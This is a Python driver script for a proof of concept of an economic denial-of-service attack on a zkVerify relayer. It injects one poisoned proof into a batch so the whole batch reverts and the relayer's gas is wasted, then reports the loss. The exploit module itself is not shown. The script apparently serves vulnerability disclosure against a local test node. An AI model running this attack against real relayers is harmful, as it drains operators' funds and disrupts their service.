"""
run_demo.py
This is the main orchestration script for the PoC.
It demonstrates the gas-draining DoS attack from start to finish.
"""
import os
import sys
from src.database import Database
from src.exploit import inject_proofs
from src.relayer import VulnerableRelayer

def main():
    print("===================================================================")
    print("= zkVerify PoC: Economic DoS via Atomic Batch Poisoning           =")
    print("===================================================================")

    # Step 1: Initialize a clean database for the demo
    db = Database()

    # Step 2: Initialize the Vulnerable Relayer
    relayer = VulnerableRelayer(db)
    
    # Step 3: Check initial balance
    try:
        initial_balance = relayer.get_balance()
        print(f"\n[DEMO] 📈 Initial Relayer Balance: {initial_balance:.6f} VFY")
    except Exception as e:
        print(f"\n[DEMO] ❌ FATAL: Could not connect to the zkVerify node.")
        print(f"       Please ensure your RPC_URL in .env is correct and the node is running.")
        print(f"       Error: {e}")
        sys.exit(1)

    # Step 4: Simulate attacker and legitimate users
    # Inject 5 valid proofs and 1 poisoned proof into the database
    inject_proofs(db, num_valid=5, inject_poison=True)

    # Step 5: Run the vulnerable relayer to process the batch
    print("\n[DEMO] ▶️ Running the vulnerable relayer...")
    relayer.run_batch()

    # Step 6: Check the final balance and report the outcome
    try:
        final_balance = relayer.get_balance()
        print(f"\n[DEMO] 📉 Final Relayer Balance: {final_balance:.6f} VFY")
        
        loss = initial_balance - final_balance
        print("\n===================================================================")
        print("= PoC Result                                                      =")
        print("===================================================================")
        print(f"  - Gas Loss: {loss:.6f} VFY")
        print("  - Proofs Verified: 0")
        print("  - Attack Result: SUCCESS")
        print("\nConclusion: The relayer spent funds on gas for a batch that was")
        print("reverted due to a single poisoned proof, achieving 0 results.")
        print("===================================================================")

    except Exception as e:
        print(f"\n[DEMO] ❌ Error checking final balance: {e}")

if __name__ == "__main__":
    # Create a .env file if it doesn't exist, to avoid errors
    if not os.path.exists('.env'):
        with open('.env', 'w') as f:
            f.write('RELAYER_MNEMONIC="your twelve words here"\\n')
            f.write('ZKVERIFY_RPC_URL="ws://127.0.0.1:9944"\\n')
    main()
